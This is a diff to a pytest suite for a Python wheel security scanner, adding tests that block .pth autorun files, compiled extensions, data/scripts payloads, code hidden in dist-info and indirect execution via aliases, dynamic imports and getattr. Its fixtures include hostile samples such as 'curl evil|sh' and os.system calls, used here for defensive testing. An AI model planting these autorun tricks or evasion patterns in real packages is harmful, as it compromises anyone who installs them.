@@ -386,7 +386,14 @@ def test_the_result_serialises_without_a_path(tmp_path) -> None:
     payload = result.as_json()
     assert payload["verdict"] == "safe"
     assert payload["prompt_scan"] == "static-only"
-    assert set(payload) == {"verdict", "reasons", "prompt_scan", "files_scanned", "prompt_files"}
+    assert set(payload) == {
+        "verdict",
+        "reasons",
+        "prompt_scan",
+        "files_scanned",
+        "prompt_files",
+        "members_accounted",
+    }
 
 
 def test_scan_prompts_runs_the_platform_screen_when_asked(tmp_path) -> None:
@@ -407,8 +414,217 @@ def test_scan_prompts_runs_the_platform_screen_when_asked(tmp_path) -> None:
 
 def test_scan_prompts_on_clean_text_is_screened_not_flagged(tmp_path) -> None:
     path = _build_wheel(
-        tmp_path, extra={"acme_tools/README.md": "A tool that reports host state.\n"}
+        tmp_path, extra={"acme_tools/notes.txt": "A tool that reports host state.\n"}
     )
     contents = wheel.open_wheel(path, tmp_path / "x")
     result = scan.scan_wheel(contents, scan_prompts=True)
     assert result.prompt_scan == "screened"
+
+
+# ==========================================================================
+# C1 — every member is accounted for, not just *.py
+#
+# The scan classified a walked file as either Python source or prompt text and
+# dropped everything else on the floor. Four wheels graded `safe` with zero
+# reasons while carrying a payload that executes: a `.pth` (which site.py runs
+# at EVERY interpreter start — before the loader, before the manifest gate,
+# before `enabled: false`), a compiled extension, a shell script pip puts on
+# PATH, and code hidden in .dist-info, which the walk skipped wholesale.
+#
+# A clean verdict about bytes nobody opened is the inert-control shape this
+# platform keeps rediscovering. Every one of these is now a refusal.
+# ==========================================================================
+
+
+def test_a_pth_file_is_blocked(tmp_path) -> None:
+    """site.py executes every .pth line starting with `import ` at interpreter
+    start. The plugin never has to load, or even be enabled, to run."""
+    result = _scanned(
+        tmp_path,
+        extra={"acme_bootstrap.pth": "import os; os.system('touch /tmp/pwned')\n"},
+    )
+    assert result.verdict == "blocked", _reasons(result)
+    assert "acme_bootstrap.pth" in _reasons(result)
+
+
+def test_a_pth_file_inside_the_package_is_also_blocked(tmp_path) -> None:
+    result = _scanned(tmp_path, extra={"acme_tools/hook.pth": "import acme_tools\n"})
+    assert result.verdict == "blocked", _reasons(result)
+
+
+@pytest.mark.parametrize(
+    "name", ["acme_tools/_speed.so", "acme_tools/_speed.pyd", "acme_tools/_s.dylib"]
+)
+def test_a_compiled_extension_is_blocked(tmp_path, name) -> None:
+    """Nothing here can read machine code, and this installer only accepts
+    pure-Python wheels. Saying so is better than grading it safe."""
+    result = _scanned(tmp_path, extra={name: "\x7fELF not really\n"})
+    assert result.verdict == "blocked", _reasons(result)
+    assert name.rsplit("/", 1)[-1] in _reasons(result)
+    assert "pure-Python" in _reasons(result)
+
+
+def test_a_data_scripts_payload_is_blocked(tmp_path) -> None:
+    """`*.data/scripts/` is what pip puts on PATH."""
+    result = _scanned(
+        tmp_path,
+        extra={"acme_tools-1.2.3.data/scripts/acme-helper": "#!/bin/sh\ncurl evil|sh\n"},
+    )
+    assert result.verdict == "blocked", _reasons(result)
+    assert "acme-helper" in _reasons(result)
+
+
+def test_a_data_data_payload_is_blocked(tmp_path) -> None:
+    """`*.data/data/` is written relative to sys.prefix — outside the package."""
+    result = _scanned(
+        tmp_path,
+        extra={"acme_tools-1.2.3.data/data/etc/acme.conf": "x\n"},
+    )
+    assert result.verdict == "blocked", _reasons(result)
+
+
+def test_code_hidden_in_dist_info_is_scanned(tmp_path) -> None:
+    """The walk skipped `*.dist-info/` wholesale, so a module parked there was
+    never read. Only the known metadata files are exempt now."""
+    result = _scanned(
+        tmp_path,
+        extra={"acme_tools-1.2.3.dist-info/_setup.py": "import os\nos.system('id')\n"},
+    )
+    assert result.verdict == "blocked", _reasons(result)
+    assert "os.system" in _reasons(result)
+
+
+def test_an_unknown_file_type_in_dist_info_is_blocked(tmp_path) -> None:
+    result = _scanned(tmp_path, extra={"acme_tools-1.2.3.dist-info/payload.bin": "\x00\x01"})
+    assert result.verdict == "blocked", _reasons(result)
+    assert "payload.bin" in _reasons(result)
+
+
+def test_a_shell_script_anywhere_is_blocked(tmp_path) -> None:
+    result = _scanned(tmp_path, extra={"acme_tools/install.sh": "#!/bin/sh\nid\n"})
+    assert result.verdict == "blocked", _reasons(result)
+
+
+def test_an_executable_member_is_blocked(tmp_path) -> None:
+    """The mode is read from the zip header: extraction narrows every member to
+    0600, so by the time the tree exists the evidence is gone."""
+    path = tmp_path / "acme_tools-1.2.3-py3-none-any.whl"
+    with zipfile.ZipFile(path, "w") as zf:
+        zf.writestr("acme_tools/__init__.py", _CLEAN_CODE)
+        zf.writestr("acme_tools/genus-plugin.yaml", _MANIFEST)
+        zf.writestr("acme_tools-1.2.3.dist-info/METADATA", _METADATA)
+        zf.writestr("acme_tools-1.2.3.dist-info/entry_points.txt", _ENTRY_POINTS)
+        info = zipfile.ZipInfo("acme_tools/data.txt")
+        info.external_attr = (0o100755) << 16
+        zf.writestr(info, "inert\n")
+    contents = wheel.open_wheel(path, tmp_path / "x")
+    result = scan.scan_wheel(contents)
+    assert result.verdict == "blocked", _reasons(result)
+    assert "executable" in _reasons(result)
+
+
+@pytest.mark.parametrize(
+    "name",
+    [
+        "acme_tools/config.yaml",
+        "acme_tools/data.json",
+        "acme_tools/notes.txt",
+        "acme_tools/icon.png",
+        "acme_tools/py.typed",
+        "acme_tools/LICENSE",
+        "acme_tools-1.2.3.dist-info/RECORD",
+        "acme_tools-1.2.3.dist-info/licenses/LICENSE.txt",
+    ],
+)
+def test_inert_assets_do_not_block(tmp_path, name) -> None:
+    """The rule is "every member is accounted for", not "every member is
+    suspicious". A plugin shipping its own config schema must stay safe."""
+    result = _scanned(tmp_path, extra={name: "inert\n"})
+    assert result.verdict == "safe", _reasons(result)
+
+
+def test_the_result_counts_every_member(tmp_path) -> None:
+    result = _scanned(tmp_path, extra={"acme_tools/config.yaml": "a: 1\n"})
+    # 2 py/metadata-free sources? No: __init__.py is the only source; the
+    # manifest, METADATA, entry_points.txt, WHEEL and config.yaml are assets.
+    assert result.files_scanned == 1
+    assert result.members_accounted >= 6
+
+
+# ==========================================================================
+# C2 — the code rules follow names, not spellings
+#
+# Every construct below produced `safe` while executing a shell command. The
+# rules matched the spelling at the call site, so one level of indirection --
+# an import alias, a rebinding, a dynamic lookup -- walked straight past them.
+# Two of these are named verbatim in the task brief as the attack to defend
+# against.
+# ==========================================================================
+
+
+@pytest.mark.parametrize(
+    ("body", "needle"),
+    [
+        ("import os\n__import__('os').system('id')\n", "os.system"),
+        (
+            "import importlib\nimportlib.import_module('sub'+'process').run(['id'])\n",
+            "dynamic",
+        ),
+        ("import importlib\nimportlib.import_module('subprocess').run(['id'])\n", "subprocess"),
+        ("from os import system\nsystem('curl evil|sh')\n", "os.system"),
+        ("import builtins\nbuiltins.exec(CODE)\n", "exec"),
+        ("def f(c):\n    e = exec\n    e(c)\n", "exec"),
+        ("import subprocess\nsubprocess.run(['sh', '-c', CODE])\n", "subprocess"),
+        ("import os\nos.execl('/bin/sh', 'sh', '-c', 'x')\n", "os.execl"),
+        ("def f(c):\n    return globals()['ev' + 'al'](c)\n", "dynamic"),
+        ("def f(c):\n    return locals()['x'](c)\n", "dynamic"),
+        ("def f(c):\n    return vars()['x'](c)\n", "dynamic"),
+        ("import subprocess as s\ns.Popen(['id'])\n", "subprocess"),
+        ("from subprocess import run\nrun(['id'])\n", "subprocess"),
+        ("import os\nos.spawnl(os.P_WAIT, '/bin/sh', 'sh')\n", "os.spawnl"),
+        ("import os\nos.popen('id')\n", "os.popen"),
+        ("def f(n):\n    return __import__(n)\n", "dynamic"),
+        ("import os\nf = os.system\nf('id')\n", "os.system"),
+        ("def f(m, n):\n    return getattr(m, n)\n", "dynamic"),
+    ],
+)
+def test_indirect_execution_is_blocked(tmp_path, body, needle) -> None:
+    code = "CODE = 'id'\n" + body + 'PLUGIN = {"handlers": {"probe": lambda: None}}\n'
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "blocked", _reasons(result)
+    assert needle in _reasons(result)
+
+
+def test_a_literal_exec_is_still_not_blocked(tmp_path) -> None:
+    """The negative that keeps the rule honest: `exec("X = 1")` is inert and
+    appears in real packaging shims, and a docstring mentioning eval( must
+    never cost an operator an --accept-review."""
+    code = (
+        '"""Never call eval( or exec( or os.system( here."""\n'
+        'exec("X = 1")\n'
+        'PLUGIN = {"handlers": {"probe": lambda: None}}\n'
+    )
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict != "blocked", _reasons(result)
+
+
+def test_getattr_on_a_literal_safe_name_is_not_blocked(tmp_path) -> None:
+    code = "import json\nd = getattr(json, 'dumps')\nPLUGIN = {'handlers': {}}\n"
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict != "blocked", _reasons(result)
+
+
+@pytest.mark.parametrize("module", ["os", "socket", "importlib", "subprocess"])
+def test_importing_a_process_or_network_module_is_at_least_review(tmp_path, module) -> None:
+    """A bare `import subprocess` is not itself an escape, but it is the thing
+    an operator should be told about -- it was not even a reason before."""
+    code = f"import {module}\nPLUGIN = {{'handlers': {{}}}}\n"
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict in ("review", "blocked"), _reasons(result)
+    assert module in _reasons(result)
+
+
+def test_an_alias_of_a_safe_module_stays_safe(tmp_path) -> None:
+    code = "import json as j\nPLUGIN = {'handlers': {'probe': lambda: j.dumps({})}}\n"
+    result = _scanned(tmp_path, code=code)
+    assert result.verdict == "safe", _reasons(result)
